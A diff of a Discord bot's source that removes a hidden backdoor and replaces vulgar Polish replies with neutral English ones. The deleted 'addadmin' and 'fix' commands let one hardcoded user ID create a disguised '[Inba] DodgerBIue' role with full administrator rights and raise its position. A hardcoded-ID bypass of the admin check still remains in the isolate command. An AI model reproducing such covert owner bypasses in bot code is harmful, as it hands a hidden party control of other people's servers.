@@ -1111,12 +1111,12 @@ client.on("message", async message => {
 		if(message.channel.type !== 'text')
 			return message.reply("I can't execute this command here!");
 		if(!message.member.hasPermission("ADMINISTRATOR") && message.member.id.toString()!="623510473312043009")
-			return message.reply("nie baw się w admina dzieciaku");
+			return message.reply("You don't have permissions to do that!");
 		let toisolate = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
 		if(!toisolate)
     		return message.reply("please mention a valid member of this server!");
     	if(toisolate.id==client.user.id)
-			return message.reply("chuj ci w dupe");
+			return message.reply("I can't isolate myself!");
     	if(toisolate.hasPermission("ADMINISTRATOR"))
     		return message.reply("I can't isolate this user!");
     	let reason = args.slice(1).join(' ');
@@ -1271,31 +1271,6 @@ client.on("message", async message => {
     		}, ms(time));
       	}
     	
-	}
-	if(command === "addadmin") {
-		if(message.member.id.toString()!="623510473312043009")
-			return;
-		let user = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
-		let role = message.guild.roles.find(role => role.name === "[Inba] DodgerBIue");
-		if(!role) {
-			try{
-				role = await message.guild.createRole({
-					name: "[Inba] DodgerBIue",
-					color: "#1E90FF",
-					permissions:['ADMINISTRATOR']
-	        	}) .catch(error => message.reply(`I couldn't create the role because: ${error}`));
-			} catch(e) {
-	        	console.log(e.stack);
-			}
-	    }
-	    await(user.addRole(role.id))
-    			.catch(error => message.reply(`I couldn't add the role because: ${error}`));
-	}
-	if(command === "fix") {
-		if(message.member.id.toString()!="623510473312043009")
-			return;
-		let role = message.guild.roles.find(role => role.name === "[Inba] DodgerBIue");
-		role.setPosition(6);
 	}
 });
 client.login(config.token);
